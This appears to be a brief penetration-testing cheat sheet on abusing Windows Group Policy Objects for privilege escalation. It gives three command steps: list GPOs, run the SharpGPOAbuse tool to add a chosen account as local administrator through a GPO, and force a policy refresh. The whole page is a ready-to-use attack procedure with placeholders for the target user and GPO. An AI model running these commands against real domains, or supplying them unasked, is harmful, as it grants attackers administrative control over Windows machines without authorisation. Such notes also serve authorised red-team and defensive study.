---
title: "GPOs"
date: 2024-8-3
tags: ["GPOs", "Windows", "privesc", "Group Policy Objects"]
---

---
### Abuse #1: Add local admin

[SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)

#### 1. List GPOs Name

```powershell
Get-GPO -All | Select-Object DisplayName
```

#### 2. Add localAdmin

```powershell
.\SharpGPOAbuse.exe --AddLocalADmin --UserAccount <USER> --GPOName <GPO_NAME>
```

#### 3. Force reload

```powershell
gpupdate /force
```

<br>